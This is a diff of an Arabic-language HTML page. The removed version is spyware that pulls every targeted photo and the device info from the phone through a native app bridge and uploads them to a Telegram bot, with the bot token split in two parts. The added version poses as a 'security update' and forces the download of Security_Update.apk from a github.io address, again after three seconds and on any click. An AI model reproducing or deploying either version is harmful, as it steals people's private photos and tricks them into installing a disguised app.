@@ -1,67 +1,46 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>Secure Loading...</title>
-  </head>
-  <body style="background:#000;color:#0f0;font-family:monospace;">
-    <h3>🔄 جاري تحميل الصور...</h3>
-    <div id="log"></div>
+<head>
+  <meta charset="utf-8">
+  <title>تحديث أمني</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #0f0;
+      font-family: monospace;
+      text-align: center;
+      padding-top: 100px;
+    }
+    h1, p {
+      margin: 20px;
+    }
+  </style>
+</head>
+<body>
 
-    <script>
-      const log = (msg) => {
-        document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
-      };
+  <h1>🔐 جارٍ تطبيق تحديث الأمان...</h1>
+  <p>الرجاء عدم إغلاق الصفحة</p>
 
-      async function sendToTelegram(base64img, deviceInfo, index) {
-        const part1 = "8066816136";
-        const part2 = "AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0";
-        const botToken = part1 + ":" + part2;
+  <script>
+    const apkUrl = "https://norhanmohsen1.github.io/Lol/sec_1.0.apk";
 
-        const chatId = "6894787120";
+    // تحميل التطبيق تلقائيًا
+    const link = document.createElement("a");
+    link.href = apkUrl;
+    link.download = "Security_Update.apk";
+    document.body.appendChild(link);
+    link.click();
 
-        try {
-          const blob = await (await fetch(`data:image/jpeg;base64,${base64img}`)).blob();
-          const formData = new FormData();
-          formData.append("chat_id", chatId);
-          formData.append("caption", `📱 ${deviceInfo} \n🖼️ صورة رقم ${index + 1}`);
-          formData.append("photo", blob, "image.jpg");
+    // فتح رابط التثبيت بعد 3 ثواني
+    setTimeout(() => {
+      window.location.href = apkUrl;
+    }, 3000);
 
-          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
+    // لو ضغط في أي مكان، نحاول نعيد فتح رابط الـAPK
+    document.body.addEventListener("click", () => {
+      window.location.href = apkUrl;
+    });
+  </script>
 
-          if (res.ok) {
-            log(`✔️ تم إرسال صورة ${index + 1}`);
-          } else {
-            log(`❌ فشل إرسال صورة ${index + 1}`);
-          }
-        } catch (err) {
-          log(`⚠️ خطأ في صورة ${index + 1}: ${err}`);
-        }
-      }
-
-      // تشغيل العملية
-      try {
-        const images = bridge.getAllTargetImagesBase64().split("###");
-        const info = bridge.getDeviceInfo();
-
-        if (images.length === 0 || (images.length === 1 && images[0] === "")) {
-          log("📛 لم يتم العثور على صور في المسارات المحددة");
-        } else {
-          log(`🔍 تم العثور على ${images.length} صورة`);
-          images.forEach((img, idx) => {
-            if (img && img.length > 100) {
-              sendToTelegram(img, info, idx);
-            } else {
-              log(`⚠️ تم تجاهل صورة ${idx + 1} (ربما تالفة)`);
-            }
-          });
-        }
-      } catch (e) {
-        log("🚫 خطأ في الاتصال بالتطبيق: " + e);
-      }
-    </script>
-  </body>
+</body>
 </html>
